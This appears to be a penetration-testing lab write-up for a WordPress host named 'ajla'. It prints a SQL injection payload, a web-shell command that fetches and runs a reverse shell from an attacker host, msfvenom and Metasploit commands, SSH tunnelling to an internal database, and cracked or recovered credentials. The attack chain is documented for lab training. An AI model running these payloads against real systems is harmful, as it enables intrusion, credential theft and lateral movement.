# Ajla (10.4.4.10)
***
> [!info] 
> The initial target is a wordpress site `http://sandbox.local` which points to an external IP `10.11.1.250`.   

## Enumeration
1. We scanned the target using `wpscan`
```
wpscan --url http://sandbox.local --enumerate ap,at,cb,dbe
```

2. `wpscan` was able to detect several plugins installed but the most interesting one is the plugin named `WordPress Survey & Poll`. Checking on its [readme.txt](http://sandbox.local/wp-content/plugins/wp-survey-and-poll/readme.txt) suggest that the current version might be `1.5.7.3`

![[wpsandbox-changelog.png]]

> [!info] 
> Before **Wordpress 5.8**, almost all plugins have a `readme.txt`. The `readme.txt` file is intended to be written using a subset of markdown and usually readable publicly (as it is a text file). 

3. Using `searchploit`, we are able to know that the current version is vulnerable to SQL Injection   
![[wpsandbox-sqli.png]]

***
## Exploit
1. Using the proof of concept from [EDB-45411](https://www.exploit-db.com/exploits/45411), we we're able to extract the Wordpress Admin's **username** and **password hash**.

```
curl -i -s -k -X $'GET' -b $'wp_sap=[\"1650149780\')) OR 1=1 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,(SELECT concat(user_login,\':\',user_pass) from wp_users),11#\"]' $'http://sandbox.local/' | grep "var sss_params"
```

![[wpsandbox-ssparam.png]]


```
Username: wp_ajla_admin
Hash: $P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i/
```   
2. Using **John the Ripper (JtR)**, we are able to extract the plaintext `?:!love29jan2006!`
   
![[wpsandbox-jtr.png]]
   
3. Using the credentials, we are able to login to the **Wordpress Admin Dashboard** and was able to upload our web shell as Wordpress plugin.   
   
4. We generated a meterpreter shell that creates a connection on our port **443**
   
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=443 -f elf -o xshell.elf
```

```
sudo msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost KALI_IP; set lport 443; exploit"
```

5. Using our web shell, we uploaded and executed our meterpreter shell on the server
```
curl -i -s -k -X $'GET' $'http://sandbox.local/wp-content/plugins/xshell/xshell.php?cmd=wget+http://KALI_IP/xshell.elf+%26%26+chmod+%2bx+xshell.elf+%26%26+./xshell.elf'
```

6. Using our meterpreter shell, we are able to execute OS commands on the server.   
   ![[ajla-meterpreter.png]]

> [!info] 
> We are able to know that the hostname of the server is `ajla` and it has an internal IP `10.4.4.10` 

7. We are able to read `wp-config.php` and retrieved the information of database used by Wordpress. The database has the IP `10.5.5.11`

```
DB name: wordpress
User: wp
Password: Lv9EVQq86cfi8ioWsqFUQyU
Host: 10.5.5.11
```

> [!todo] 
>  We discovered a connection to the database with an IP `10.5.5.11`. But this database server is not accessible externally, that means we need to set up a remote port forwarding to be able to access it from our Kali machine. 

8. From our shell, we generated a keypair using `ssh-keygen` and added the victim's public key into our Kali machine(authorized_keys) using the following settings:
   
```
from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3Nz....IQv www-data@ajla
```
   

9. We set up a remote port forward from ajla to expose port **22** and port **3306** of zora to Kali. We used port **1122** of Kali to point to port **22** of zora, and used **13306** of Kali to point to port **3306** of zora.

 ``` 
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@KALI_IP
```

9. Using the retrieved credentials, we tried to connect to the database (**MariaDB**) server and attempted to execute OS commands. Unfortunately (for us), the user (`wp`) doesn't have enough privilege for us to be able to execute OS commands.
   
```
mysql --host=127.0.0.1 --port=13306 --user=wp -pLv9EVQq86cfi8ioWsqFUQyU
```
 
## Post-exploitation

1. Using our reverse shell, we did further enumeration and found out that the server is using an outdated Linux kernel
![[ajla-uname.png]]

2. We searched for reported vulnerabilities for that version and we found the Local Privilege Escalation exploit [EDB-45010](https://www.exploit-db.com/exploits/45010)
3. We compiled the exploit and transferred it into the target server. 
3. We executed the exploit on the server and we got a root access.
   ![[ajla-root.png]]
4. We accessed the file  `/root/.bash_history` and we got a credentials for mysql root user (for `10.5.5.11`)
```
user: root
password: BmDu9xUHKe3fZi3Z7RdMBeb
host: 10.5.5.11
```

![[ajla-root-proof.png]]
